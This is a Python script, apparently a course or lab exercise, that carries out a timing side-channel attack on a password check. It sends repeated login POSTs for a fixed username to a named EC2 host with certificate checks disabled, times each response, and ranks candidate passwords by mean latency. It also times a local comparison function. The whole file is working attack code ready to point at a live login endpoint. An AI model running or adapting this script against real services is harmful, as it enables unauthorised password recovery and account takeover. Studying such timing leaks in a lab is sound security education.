# This is a sample Python script.

# Press ⇧F10 to execute it or replace it with your code.
# Press Double ⇧ to search everywhere for classes, files, tool windows, actions, and settings.
import datetime
import logging
import multiprocessing.pool as mpp
import sys
import warnings
from typing import Tuple, List

import numpy as np
import requests

from test_server import test_local_compare

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO,
                    format='[%(asctime)s] - %(levelname)s - %(module)s: %(message)s',
                    stream=sys.stdout)


def send(pwd: str) -> Tuple[int, int]:
    start = datetime.datetime.now()
    r = requests.post(
        'https://ec2-18-218-24-114.us-east-2.compute.amazonaws.com:8080',
        data={'username': 'au597939', 'password': pwd},
        verify=False
    )
    end = datetime.datetime.now()
    delta = (end - start)
    logger.debug(f'{r.status_code} - {r.text.strip()} | {pwd} - {delta.microseconds}')
    if r.status_code in {200, 201}:
        print(f'PWD FOUND! - {pwd}')
        exit(0)

    return r.status_code, delta.microseconds


def test_locally(pwd: str) -> Tuple[int, int]:
    start = datetime.datetime.now()
    return_code = test_local_compare(pwd)
    status_code = 200 if return_code else 403
    end = datetime.datetime.now()
    delta = (end - start)
    logger.debug(f'{status_code} | {pwd} - {delta.microseconds}')
    if status_code in {200, 201}:
        print(f'PWD FOUND! - {pwd}')
        exit(0)

    return status_code, delta.microseconds


def sample(pwd: str, rounds: int = 20) -> Tuple[str, int]:
    micros = np.asarray([send(pwd)[1] for _ in range(rounds)])
    logger.info(f'MED={np.median(micros)}, E={micros.mean()}, ST={micros.std()}')
    return pwd, micros.mean()


def send_with_pwd(pwd: str) -> Tuple[str, int]:
    _, time = test_locally(pwd)
    return pwd, time


def verify_passwords(passwords: List[str], max_workers: int = 5, sample_rounds: int = 50):
    means = {pwd: [] for pwd in passwords}
    with mpp.ThreadPool(max_workers) as pool:
        results = [pool.apply_async(send_with_pwd, [pwd]) for pwd in passwords for _ in range(sample_rounds)]
        for result in results:
            try:
                pwd, micros = result.get()
                means[pwd].append(micros)
            except ValueError as e:
                logger.exception(e)

    pwd_mean = []
    for pwd, v in means.items():
        micros = np.asarray(v)
        logger.info(f'COUNT={micros.size}, MED={np.median(micros)}, E={micros.mean()}, ST={micros.std()} -- {pwd}')
        pwd_mean.append((pwd, micros.mean()))

    pwd_mean.sort(key=lambda x: x[1], reverse=True)
    for pwd, mean in pwd_mean:
        logger.info(f'{mean} - {pwd}')


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    warnings.filterwarnings("ignore")

    verify_passwords(
        [
            'none', 'Passw', 'Password', 'Password123', 'Password111'
        ]
    )
